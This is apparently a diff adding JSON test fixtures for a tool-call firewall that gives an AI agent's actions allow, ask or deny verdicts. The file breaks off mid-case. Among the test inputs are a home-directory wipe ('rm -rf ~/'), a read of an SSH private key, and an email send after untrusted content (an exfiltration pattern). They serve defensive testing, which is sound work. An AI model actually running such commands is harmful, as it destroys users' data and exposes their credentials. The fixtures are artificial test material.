@@ -1,0 +1,2882 @@
+[
+  {
+    "id": "native-read-then-send-asks",
+    "description": "A read tool whose results are untrusted, then a send: a person is asked (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "search_docs",
+            "input": {
+              "q": "pricing"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(outside content placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-send-in-a-trusted-session",
+    "description": "A send tool in a session that read nothing outside (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-private-read-then-send",
+    "description": "A trusted read of private data, then a send (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "get_customer",
+            "input": {
+              "id": "c-1"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": false,
+          "holdsPrivateData": true
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(private data placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": false,
+          "holdsPrivateData": true
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-trusted-nonprivate-read",
+    "description": "A read that is trusted and not private leaves the session as it was (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "list_notes",
+            "input": {}
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "note one"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-destroy-kind",
+    "description": "A destroy tool (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "delete_account",
+            "input": {
+              "id": "a-1"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-DESTRUCTIVE"
+          ],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-blocked-kind",
+    "description": "A blocked tool is never allowed (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "wire_money",
+            "input": {
+              "to": "x",
+              "amount": 10
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "deny",
+          "ruleIds": [
+            "FW-BLOCKED-TOOL"
+          ],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-bash-safe",
+    "description": "as Bash with map: an ordinary command (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "run_shell",
+            "input": {
+              "cmd": "ls -la"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-bash-destroys-root",
+    "description": "as Bash with map: deleting the home directory (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "run_shell",
+            "input": {
+              "cmd": "rm -rf ~/"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "deny",
+          "ruleIds": [
+            "FW-DESTROY-ROOT"
+          ],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-bash-after-taint",
+    "description": "as Bash with map: an install after reading outside content (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "search_docs",
+            "input": {
+              "q": "x"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(outside content placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "run_shell",
+            "input": {
+              "cmd": "npm install left-pad"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-INSTALL"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-webfetch",
+    "description": "as WebFetch with map: a fetch of an ordinary page (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "http_get",
+            "input": {
+              "url": "https://docs.example.org/guide"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-read-credentials",
+    "description": "as Read with map: a credentials file (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "read_file",
+            "input": {
+              "path": "/home/agent/.ssh/id_rsa"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-CREDENTIAL-READ"
+          ],
+          "sessionUntrusted": false,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-write-workspace",
+    "description": "as Write with two mapped fields: a file in the workspace (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "write_file",
+            "input": {
+              "path": "/srv/app/src/new.ts",
+              "body": "export const x = 1;"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-map-nested-path",
+    "description": "map with a dotted path $.args.cmd (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "nested_shell",
+            "input": {
+              "args": {
+                "cmd": "git status"
+              }
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-map-leaves-out-extras",
+    "description": "map keeps only the mapped fields: other arguments are not passed to the engine (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "run_shell",
+            "input": {
+              "cmd": "ls",
+              "extra": "ignored",
+              "more": {
+                "deep": 1
+              }
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-map-missing-source-field",
+    "description": "map whose source field is missing: the engine gets a Bash call with no command (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "run_shell",
+            "input": {
+              "command": "ls"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-UNCLASSIFIABLE"
+          ],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-without-map",
+    "description": "as without map: the arguments pass unchanged (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "raw_shell",
+            "input": {
+              "command": "git log --oneline -5"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": false,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-as-without-map-fetch",
